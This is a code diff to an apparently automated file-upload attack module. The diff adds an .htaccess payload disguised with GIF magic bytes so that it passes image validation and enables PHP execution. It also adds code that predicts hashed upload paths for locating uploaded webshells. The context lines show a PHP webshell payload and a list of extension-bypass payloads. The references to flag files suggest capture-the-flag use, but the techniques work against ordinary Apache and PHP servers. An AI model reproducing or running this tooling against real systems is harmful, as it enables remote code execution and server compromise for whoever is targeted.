@@ -4,6 +4,7 @@ Attempts PHP webshell upload via extension, content-type, and magic byte bypass 
 RCE confirmed with unique marker — no finding reported without confirmed execution.
 """
 from __future__ import annotations
+import hashlib
 import re
 from urllib.parse import urlparse, urljoin
 from uuid import uuid4
@@ -22,9 +23,16 @@ _SHELL = (
     "cat /home/*/flag* 2>/dev/null'); ?>"
 )
 _GIF_SHELL = "GIF89a\n" + _SHELL
+# .htaccess that enables PHP execution — prepended with GIF magic bytes to pass
+# image/gif validation. Apache may parse GIF89a as an unknown directive and skip it,
+# allowing AddType to take effect; or the file simply overwrites an existing restrictive
+# .htaccess in the upload directory.
+_HTACCESS = b"GIF89a\nAddType application/x-httpd-php .php\n"
 
 # Each payload uses a unique filename — no overwrite risk between iterations.
+# .htaccess has no "tweb" prefix so the UUID replacement leaves it unchanged.
 BYPASS_PAYLOADS: list[tuple[str, str, bytes]] = [
+    (".htaccess",      "image/gif",                _HTACCESS),            # PHP exec enable
     ("tweb1.php",      "application/octet-stream", _SHELL.encode()),      # basic
     ("tweb2.php5",     "application/octet-stream", _SHELL.encode()),      # Apache alt ext
     ("tweb3.phtml",    "application/octet-stream", _SHELL.encode()),      # Apache alt ext
@@ -237,6 +245,15 @@ class UploadAttack(BaseAttack):
                             candidates.insert(0, urljoin(base, p))
                         else:
                             candidates.insert(0, p)
+                # Predict MD5/SHA1 renamed paths (e.g. md5(fname).php — common CTF pattern)
+                _url_dir_pred = "/".join(urlparse(url).path.split("/")[:-1])
+                last_ext = fname.rsplit(".", 1)[-1]          # php
+                full_ext = fname.split(".", 1)[-1] if "." in fname else last_ext  # gif.php
+                for algo in (hashlib.md5, hashlib.sha1):
+                    hashed = algo(fname.encode()).hexdigest()
+                    for pred_dir in ("/uploads/", "/upload/", f"{_url_dir_pred}/uploads/", f"{_url_dir_pred}/upload/"):
+                        for ext in (last_ext, full_ext):
+                            candidates.insert(0, urljoin(base, f"{pred_dir}{hashed}.{ext}"))
                 # Fetch admin listing page — server may have renamed the file
                 listing_paths = await self._mine_listing_for_upload(url, base)
                 for p in listing_paths:
